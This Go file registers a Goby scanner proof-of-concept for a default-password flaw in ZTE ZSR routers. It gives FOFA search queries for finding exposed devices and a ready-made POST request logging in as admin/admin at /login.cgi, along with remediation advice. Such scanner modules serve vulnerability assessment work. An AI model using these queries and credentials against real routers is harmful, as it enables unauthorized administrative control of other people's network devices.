package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ZTE ZSR router system login.cgi default password Vulnerability",
    "Description": "<p>ZTE is the world's leading provider of integrated communications and information solutions, providing innovative technology and product solutions for global telecom operators, government and enterprise customers and consumers.</p><p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "ZTE-ZSRV2-Router",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "中兴 ZSR 路由器系统 login.cgi 文件默认口令漏洞",
            "Product": "ZTE-ZSRV2路由器",
            "Description": "<p>中兴通讯全球领先的综合通信信息解决方案提供商,为全球电信运营商、政企客户和消费者提供创新的技术与产品解决方案。<br></p><p>攻击者可通过默认口令&nbsp;admin/admin 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令&nbsp;admin/admin 控制整个平台，使用管理员权限操作核心的功能。<br><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "ZTE ZSR router system login.cgi default password Vulnerability",
            "Product": "ZTE-ZSRV2-Router",
            "Description": "<p>ZTE is the world's leading provider of integrated communications and information solutions, providing innovative technology and product solutions for global telecom operators, government and enterprise customers and consumers.<br></p><p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "header=\"Server: ZTE/ROSNG\"|| banner=\"Server: ZTE/ROSNG\"",
    "GobyQuery": "header=\"Server: ZTE/ROSNG\"|| banner=\"Server: ZTE/ROSNG\"",
    "Author": "2935900435@qq.com",
    "Homepage": "https://www.zte.com.cn/",
    "DisclosureDate": "2022-04-08",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login.cgi",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Username=admin&Password=admin&EncryptType=plain&Language=chinese&MainFile=/pagefile/webgui/html/chinese/index.htm"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "menuTab",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|admin:admin",
                "vulurl|define|variable|{{{scheme}}}://admin:admin@{{{hostinfo}}}/cgi-bin/login"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login.cgi",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Username=admin&Password=admin&EncryptType=plain&Language=chinese&MainFile=/pagefile/webgui/html/chinese/index.htm"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "menuTab",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|admin:admin",
                "vulurl|define|variable|{{{scheme}}}://admin:admin@{{{hostinfo}}}/cgi-bin/login"
            ]
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "5",
    "PocId": "10368"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
